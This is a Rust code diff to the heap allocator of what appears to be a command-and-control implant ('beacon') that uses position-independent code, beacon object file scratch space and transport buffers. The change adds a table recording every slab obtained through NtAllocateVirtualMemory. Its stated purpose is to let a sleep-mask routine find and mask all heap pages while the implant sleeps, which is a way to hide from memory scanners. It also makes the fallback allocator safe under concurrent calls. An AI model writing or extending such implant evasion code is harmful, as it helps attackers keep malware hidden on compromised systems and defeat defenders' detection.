@@ -12,11 +12,67 @@ use core::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 
 const SLAB_SIZE: usize = 1 << 20;
 const ALIGN: usize = 16;
+/// Maximum number of slabs the allocator can track (for heap enumeration at
+/// sleep-mask time). 16 slabs × 1 MiB default = 16 MiB, well above a typical
+/// beacon's footprint (config + transport buffers + BOF scratch).
+pub(crate) const MAX_SLABS: usize = 16;
 
 static NT_ALLOC: AtomicU64 = AtomicU64::new(0);
 static RESOLVED: AtomicBool = AtomicBool::new(false);
 static SLAB_BASE: AtomicU64 = AtomicU64::new(0);
 static SLAB_BUMP: AtomicU64 = AtomicU64::new(0);
+
+/// Descriptor for an allocated slab — base address + committed size.
+/// Tracked so `enumerate_slabs()` can hand the sleep-mask a complete list of
+/// heap regions without maintaining a separate free-list.
+#[derive(Clone, Copy)]
+struct SlabDesc {
+    base: u64,
+    len: u64,
+}
+
+/// All slabs ever allocated (bump-only, never reclaimed).
+static mut SLAB_TABLE: [SlabDesc; MAX_SLABS] = [SlabDesc { base: 0, len: 0 }; MAX_SLABS];
+static mut SLAB_COUNT: usize = 0;
+
+/// Record a newly allocated slab in the tracking table.
+/// Called from `new_slab_min` after a successful NtAllocateVirtualMemory.
+unsafe fn track_slab(base: *mut u8, committed: usize) {
+    let idx = SLAB_COUNT;
+    if idx < MAX_SLABS {
+        SLAB_TABLE[idx] = SlabDesc {
+            base: base as u64,
+            len: committed as u64,
+        };
+        SLAB_COUNT = idx + 1;
+    }
+}
+
+/// Iterator over all allocated slabs. Used by `mem::enumerate_beacon_heap_regions`
+/// to mask every heap page at sleep. Each entry is `(base_ptr, byte_len)`.
+pub fn enumerate_slabs() -> impl Iterator<Item = (*mut u8, usize)> {
+    // SAFETY: SLAB_COUNT and SLAB_TABLE are written only from the allocator
+    // (single-threaded beacon loop) and read here during sleep (same thread).
+    let count = unsafe { SLAB_COUNT };
+    let table = unsafe { SLAB_TABLE };
+    (0..count).filter_map(move |i| {
+        let d = table[i];
+        if d.base != 0 && d.len != 0 {
+            Some((d.base as *mut u8, d.len as usize))
+        } else {
+            None
+        }
+    })
+}
+
+/// Total bytes across all tracked slabs (for diagnostics).
+pub fn heap_bytes() -> usize {
+    let count = unsafe { SLAB_COUNT };
+    let table = unsafe { SLAB_TABLE };
+    (0..count)
+        .map(|i| table[i].len as usize)
+        .sum()
+}
 
 type NtAllocVirtualMemory = unsafe extern "system" fn(
     *mut core::ffi::c_void,
@@ -63,6 +119,8 @@ unsafe fn new_slab_min(min_size: usize) -> *mut u8 {
     if status < 0 || base.is_null() {
         return core::ptr::null_mut();
     }
+    // Track the slab for heap enumeration at sleep-mask time.
+    track_slab(base as *mut u8, size);
     base as *mut u8
 }
 
@@ -156,16 +214,23 @@ unsafe impl core::alloc::GlobalAlloc for NtHeapAllocator {
             }
         }
 
-        // Fallback: bump within the static buffer. Safe because PIC is
-        // single-threaded at init.
-        let cur = FALLBACK_BUF.load(Ordering::Acquire);
-        let nxt = cur + aligned as u64;
-        if nxt <= FALLBACK_SIZE as u64 {
-            FALLBACK_BUF.store(nxt, Ordering::Release);
-            let base = core::ptr::addr_of_mut!(FALLBACK_MEM) as *mut u8;
-            return base.add(cur as usize);
+        // Fallback: bump within the static buffer.
+        // Uses CAS loop to prevent two threads from receiving the same region
+        // if the fallback path is entered concurrently.
+        loop {
+            let cur = FALLBACK_BUF.load(Ordering::Acquire);
+            let nxt = cur + aligned as u64;
+            if nxt > FALLBACK_SIZE as u64 {
+                return core::ptr::null_mut();
+            }
+            if FALLBACK_BUF
+                .compare_exchange_weak(cur, nxt, Ordering::AcqRel, Ordering::Relaxed)
+                .is_ok()
+            {
+                let base = core::ptr::addr_of_mut!(FALLBACK_MEM) as *mut u8;
+                return base.add(cur as usize);
+            }
         }
-        core::ptr::null_mut()
     }
     unsafe fn dealloc(&self, _ptr: *mut u8, _layout: core::alloc::Layout) {}
 }
